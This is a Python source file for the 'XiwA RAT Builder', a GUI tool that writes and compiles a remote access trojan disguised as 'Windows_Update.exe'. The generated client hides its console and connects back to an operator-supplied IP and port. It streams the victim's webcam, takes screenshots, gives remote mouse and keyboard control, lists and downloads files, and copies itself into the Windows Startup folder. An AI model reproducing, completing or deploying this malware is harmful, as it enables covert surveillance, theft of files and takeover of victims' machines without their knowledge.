"""
Copyright (c) 2025 Dryz3R - XiwA Tool
All rights reserved.

ENGLISH:
This software is the property of Dryz3R and is protected by copyright laws.
Unauthorized copying, distribution, or modification of this software is strictly prohibited.
XiwA Tool is a comprehensive security and analysis suite developed by Dryz3R.

FRANÇAIS:
Ce logiciel est la propriété de Dryz3R et est protégé par les lois sur le droit d'auteur.
La copie, la distribution ou la modification non autorisée de ce logiciel est strictement interdite.
XiwA Tool est une suite complète de sécurité et d'analyse développée par Dryz3R.

ESPAÑOL:
Este software es propiedad de Dryz3R y está protegido por las leyes de derechos de autor.
Se prohíbe estrictamente la copia, distribución o modificación no autorizada de este software.
XiwA Tool es una suite completa de seguridad y análisis desarrollada por Dryz3R.
"""

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import tkinter as tk
from tkinter import ttk, messagebox
import customtkinter as ctk
import socket
import threading
import json
import os
import sys
import subprocess
import platform
import pyautogui
import cv2
from PIL import Image, ImageTk
import psutil
import winreg
import ctypes
import requests
from io import BytesIO
import base64
import cx_Freeze
import PyInstaller.__main__

class BuilderGUI:
    def __init__(self):
        self.root = ctk.CTk()
        self.root.title("XiwA RAT Builder")
        self.root.geometry("1920x1080")
        self.root.resizable(True, True)
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("blue")

        self.title_label = ctk.CTkLabel(
            self.root,
            text="XiwA RAT Builder",
            font=("Helvetica", 32, "bold"),
            text_color="red"
        )
        self.title_label.pack(pady=30)
        self.animate_title()

        self.main_frame = ctk.CTkFrame(
            self.root,
            corner_radius=20,
            fg_color="#1a1a1a"
        )
        self.main_frame.pack(side="left", padx=20, pady=20, fill="both", expand=True)

        self.screen_frame = ctk.CTkFrame(
            self.root,
            corner_radius=20,
            fg_color="#1a1a1a",
            width=400
        )
        self.screen_frame.pack(side="right", padx=20, pady=20, fill="both")

        self.screen_label = ctk.CTkLabel(
            self.screen_frame,
            text="Écran de visualisation",
            font=("Helvetica", 20, "bold"),
            text_color="red"
        )
        self.screen_label.pack(pady=20)

        self.screen_canvas = tk.Canvas(
            self.screen_frame,
            width=380,
            height=280,
            bg="#2a2a2a",
            highlightthickness=0
        )
        self.screen_canvas.pack(pady=10)

        self.ip_entry = self.create_entry("Votre IP:", "red")
        self.pseudo_entry = self.create_entry("Votre Pseudo:", "red") 
        self.port_entry = self.create_entry("Port:", "red")
        self.port_entry.insert(0, "4444")

        options_label = ctk.CTkLabel(
            self.main_frame,
            text="Options avancées",
            font=("Helvetica", 20, "bold"),
            text_color="red"
        )
        options_label.pack(pady=20)

        self.persistence_var = tk.BooleanVar(value=True)
        self.keylogger_var = tk.BooleanVar(value=True)
        self.screen_control_var = tk.BooleanVar(value=True)
        self.webcam_var = tk.BooleanVar(value=True)
        self.stealth_var = tk.BooleanVar(value=True)

        options = [
            ("Persistence silencieuse", self.persistence_var),
            ("Keylogger", self.keylogger_var),
            ("Contrôle total", self.screen_control_var),
            ("Accès webcam", self.webcam_var),
            ("Mode furtif", self.stealth_var)
        ]

        for text, var in options:
            cb = ctk.CTkCheckBox(
                self.main_frame,
                text=text,
                variable=var,
                text_color="#ff0000",
                fg_color="#ff0000",
                hover_color="#cc0000"
            )
            cb.pack(pady=5)

        self.buttons_frame = ctk.CTkFrame(
            self.main_frame,
            fg_color="transparent"
        )
        self.buttons_frame.pack(pady=20)

        self.build_btn = ctk.CTkButton(
            self.buttons_frame,
            text="GÉNÉRER LE RAT",
            command=self._build_exe,
            font=("Helvetica", 20, "bold"),
            height=50,
            width=200,
            fg_color="#ff0000",
            hover_color="#cc0000",
            corner_radius=10
        )
        self.build_btn.pack(side="left", padx=10)

        self.compile_btn = ctk.CTkButton(
            self.buttons_frame,
            text="COMPILER .EXE",
            command=self._compile_exe,
            font=("Helvetica", 20, "bold"),
            height=50,
            width=200,
            fg_color="#ff0000",
            hover_color="#cc0000",
            corner_radius=10
        )
        self.compile_btn.pack(side="left", padx=10)

        self.progress = ctk.CTkProgressBar(
            self.main_frame,
            mode="determinate",
            progress_color="#ff0000",
            corner_radius=10
        )
        self.progress.pack(pady=20, padx=40, fill="x")
        self.progress.set(0)

    def create_entry(self, label_text, text_color):
        frame = ctk.CTkFrame(self.main_frame, fg_color="transparent")
        frame.pack(pady=10, padx=20, fill="x")
        
        ctk.CTkLabel(
            frame,
            text=label_text,
            font=("Helvetica", 16),
            text_color=text_color
        ).pack()
        
        entry = ctk.CTkEntry(
            frame,
            width=300,
            height=35,
            font=("Helvetica", 14),
            corner_radius=10
        )
        entry.pack(pady=5)
        return entry

    def animate_title(self):
        colors = ["#ff0000", "#cc0000", "#990000", "#cc0000"]
        def update_color(idx=0):
            self.title_label.configure(text_color=colors[idx])
            self.root.after(500, update_color, (idx + 1) % len(colors))
        update_color()

    def _compile_exe(self):
        try:
            self.progress.set(0)
            self.root.update_idletasks()

            PyInstaller.__main__.run([
                '--onefile',
                '--noconsole',
                '--name=Windows_Update',
                '--add-data=client.py;.',
                'client.py'
            ])

            self.progress.set(1)
            self.root.update_idletasks()

            messagebox.showinfo(
                "Succès", 
                "Compilation terminée!\nVous trouverez l'exécutable dans le dossier dist/"
            )

        except Exception as e:
            self.progress.set(0)
            messagebox.showerror("Erreur", f"Erreur lors de la compilation: {str(e)}")

    def _build_exe(self):
        ip = self.ip_entry.get()
        port = self.port_entry.get()
        pseudo = self.pseudo_entry.get()

        if not ip or not port or not pseudo:
            messagebox.showerror("Erreur", "Veuillez remplir tous les champs")
            return

        client_code = f"""
import socket
import subprocess
import pyautogui
import keyboard
import threading
import os
from PIL import ImageGrab
import win32gui
import win32con
import win32api
import ctypes
import sys
import cv2
import time
import shutil

SERVER_HOST = '{ip}'
SERVER_PORT = {port}
BUFFER_SIZE = 1024 * 128

def hide_console():
    kernel32 = ctypes.WinDLL('kernel32')
    user32 = ctypes.WinDLL('user32')
    get_console_window = kernel32.GetConsoleWindow
    show_window = user32.ShowWindow
    hwnd = get_console_window()
    show_window(hwnd, 0)

def establish_connection():
    while True:
        try:
            sock = socket.socket()
            sock.connect((SERVER_HOST, SERVER_PORT))
            return sock
        except:
            time.sleep(5)

def handle_webcam(sock):
    cap = cv2.VideoCapture(0)
    while True:
        ret, frame = cap.read()
        if ret:
            _, buffer = cv2.imencode('.jpg', frame)
            sock.send(buffer.tobytes())

def handle_remote_control(sock):
    webcam_thread = threading.Thread(target=handle_webcam, args=(sock,))
    webcam_thread.daemon = True
    webcam_thread.start()

    while True:
        try:
            command = sock.recv(BUFFER_SIZE).decode()
            if command.startswith('mouse_move'):
                x, y = map(int, command.split()[1:])
                pyautogui.moveTo(x, y)
            elif command.startswith('mouse_click'):
                button = command.split()[1]
                pyautogui.click(button=button)
            elif command.startswith('key_press'):
                key = command.split()[1]
                keyboard.press_and_release(key)
            elif command == 'screenshot':
                screenshot = ImageGrab.grab()
                screenshot.save('temp.png')
                with open('temp.png', 'rb') as f:
                    sock.send(f.read())
                os.remove('temp.png')
            elif command.startswith('browse'):
                path = command.split()[1]
                files = os.listdir(path)
                sock.send(json.dumps(files).encode())
            elif command.startswith('download'):
                file_path = command.split()[1]
                with open(file_path, 'rb') as f:
                    sock.send(f.read())
        except:
            break

def persistence():
    if getattr(sys, 'frozen', False):
        app_path = sys.executable
        startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        try:
            shutil.copy2(app_path, os.path.join(startup_path, 'Windows_Update.exe'))
        except:
            pass

def main():
    hide_console()
    if {self.persistence_var.get()}:
        persistence()
    
    sock = establish_connection()
    handle_remote_control(sock)

if __name__ == '__main__':
    main()
"""

        script_dir = os.path.dirname(os.path.abspath(__file__))
        client_path = os.path.join(script_dir, "client.py")
        
        with open(client_path, "w") as f:
            f.write(client_code)

        self.progress.set(1)
        messagebox.showinfo(
            "Succès",
            "Code RAT généré avec succès!\nCliquez sur 'COMPILER .EXE' pour créer l'exécutable"
        )

    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    builder = BuilderGUI()
    builder.run()